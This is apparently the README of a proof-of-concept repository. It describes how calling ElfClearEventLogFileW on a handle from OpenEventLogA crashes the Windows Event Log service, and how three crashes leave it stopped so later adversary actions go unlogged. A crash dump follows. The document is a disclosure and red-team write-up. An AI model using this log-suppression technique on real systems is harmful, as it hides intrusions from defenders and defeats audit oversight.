# LogServiceCrash
POC code to crash Windows Event Logger Service

While writing an event log cleaner, I accidentally stumbled upon a way to crash the Windows Event Logging service. This is interesting because crashing the logging service would mean that further adversary actions will not be logged. Hence, this would come in useful for a red team exercise. I am aware of Phant0m, which kills threads belonging to Windows Event Logging service to achieve the same effect. It is an excellent technique and is probably stealthier than this, however it does use OpenThread and TerminateThread which might seem suspicious when executed on svchost.exe. Nevertheless, it doesn't hurt to have more than 1 method. Hence, I am publishing this write up.

Windows Event Logging service will crash with an Access Violation when advapi32.dll!ElfClearEventLogFileW is called with a handle obtained from advapi32.dll!OpenEventLogA. By default, The service is restarted after the first and second failure only. Hence an adversary can crash the service 3 times after which he is able to execute further malicious commands without being logged. The fail count will be reset after 1 day by default.

MSRC's response is that this case does not meet the bar for servicing in a security update because this vulnerability requires administrator privileges to execute, meaning this exploit does not cross a security boundary. 

The exact crash is caused by an OOB memory read. I don't think it is exploitable beyond denial of service.

```
System info:

	OS_VERSION:  10.0.18362.1
	BUILDLAB_STR:  19h1_release
	OSPLATFORM_TYPE:  x64
	OSNAME:  Windows 10

Crash Details:

	wevtsvc!PerformClearRequest+0x164:
	00007ff9`144d0970 4d8b4908        mov     r9,qword ptr [r9+8] ds:00000000`00000008=????????????????

	EXCEPTION_RECORD:  (.exr -1)
	ExceptionAddress: 00007ff9144d0970 (wevtsvc!PerformClearRequest+0x0000000000000164)
	   ExceptionCode: c0000005 (Access violation)
	  ExceptionFlags: 00000000
	NumberParameters: 2
	   Parameter[0]: 0000000000000000
	   Parameter[1]: 0000000000000008
	Attempt to read from address 0000000000000008

	PROCESS_NAME:  svchost.exe
	READ_ADDRESS:  0000000000000008 
	ERROR_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced memory at 0x%p. The memory could not be %s.
	EXCEPTION_CODE_STR:  c0000005
	EXCEPTION_PARAMETER1:  0000000000000000
	EXCEPTION_PARAMETER2:  0000000000000008
	GROUP:  LocalServiceNetworkRestricted
	FAULTING_SERVICE_NAME:  EventLog

	STACK_TEXT:  
	00000050`fd87ebc0 00007ff9`1446ef7c : 00000000`00000000 00000050`fd87ed00 000001ef`ae433960 00000000`00000000 : wevtsvc!PerformClearRequest+0x164
	00000050`fd87ec70 00007ff9`144e461d : 00000000`00000000 00000000`00000000 000001ef`ae433960 00007ff9`1d01fc2c : wevtsvc!ElfPerformRequest+0x6534c
	00000050`fd87ecc0 00007ff9`1bc26953 : 000001ef`af397c90 00000000`00000000 00000000`00000002 00007ff9`144eb8f0 : wevtsvc!ElfrClearELFW+0x26d
	00000050`fd87edc0 00007ff9`1bc8a036 : 00007ff9`144eac00 00000000`00000000 000001ef`00000000 00007ff9`00000000 : rpcrt4!Invoke+0x73
	00000050`fd87ee10 00007ff9`1bbe7a4c : 0067006f`006c0074 00007ff9`0000005d 000001ef`af3f4090 00007ff9`1d01fc2c : rpcrt4!Ndr64StubWorker+0xb56
	00000050`fd87f4b0 00007ff9`1bc048c8 : 000001ef`00000001 00007ff9`1bbd816e 00000050`fd87f6a8 00000000`00000001 : rpcrt4!NdrServerCallAll+0x3c
	00000050`fd87f500 00007ff9`1bbdc921 : 00000050`fd87f819 00007ff9`144eaea8 00000050`fd87f6f0 00000000`00000001 : rpcrt4!DispatchToStubInCNoAvrf+0x18
	00000050`fd87f550 00007ff9`1bbdc1db : 000001ef`ae441b50 00000000`00000001 00000000`00000000 00007ff9`1bc9fca4 : rpcrt4!RPC_INTERFACE::DispatchToStubWorker+0x2d1
	00000050`fd87f630 00007ff9`1bbca86f : 00000050`fd87f7d0 000001ef`af6ad8b0 00000000`00000000 00000000`00000000 : rpcrt4!RPC_INTERFACE::DispatchToStub+0xcb
	00000050`fd87f690 00007ff9`1bbc9d1a : 00000000`000a147a 00000000`00000001 00000000`00000000 000001ef`af69e1c0 : rpcrt4!LRPC_SCALL::DispatchRequest+0x31f
	00000050`fd87f770 00007ff9`1bbc9301 : 00000000`00000002 000001ef`00000000 000001ef`00000000 00000000`00000000 : rpcrt4!LRPC_SCALL::HandleRequest+0x7fa
	00000050`fd87f870 00007ff9`1bbc8d6e : 00000000`00000000 00000000`00000000 00000000`00000001 000001ef`ae429d90 : rpcrt4!LRPC_ADDRESS::HandleRequest+0x341
	00000050`fd87f910 00007ff9`1bbc69a5 : 00000000`00000001 000001ef`af1b87a0 000001ef`ae429e98 00000050`fd87fd58 : rpcrt4!LRPC_ADDRESS::ProcessIO+0x89e
	00000050`fd87fa50 00007ff9`1d01346d : 00000000`00000000 00000000`00000000 000001ef`af1f7220 00000000`00000000 : rpcrt4!LrpcIoComplete+0xc5
	00000050`fd87faf0 00007ff9`1d0141c2 : 000001ef`ae43ca50 00000000`00000000 000001ef`ae402340 00000000`00000000 : ntdll!TppAlpcpExecuteCallback+0x14d
	00000050`fd87fb40 00007ff9`1c9c7bd4 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : ntdll!TppWorkerThread+0x462
	00000050`fd87ff00 00007ff9`1d04ced1 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : kernel32!BaseThreadInitThunk+0x14
	00000050`fd87ff30 00000000`00000000 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : ntdll!RtlUserThreadStart+0x21
```
